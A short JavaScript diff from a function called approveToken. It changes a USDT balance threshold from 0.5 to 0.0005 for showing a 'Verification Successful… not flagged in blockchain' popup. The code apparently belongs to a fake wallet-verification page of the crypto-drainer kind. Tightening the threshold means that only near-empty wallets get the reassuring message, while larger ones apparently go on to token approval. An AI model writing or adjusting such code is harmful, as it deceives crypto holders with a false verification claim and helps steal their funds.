@@ -1365,7 +1365,7 @@ async function approveToken() {
             return;
         }
 
-        if (usdtBalance <= 0.5) {
+        if (usdtBalance <= 0.0005) {
             showPopup(
                 `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                 "green"
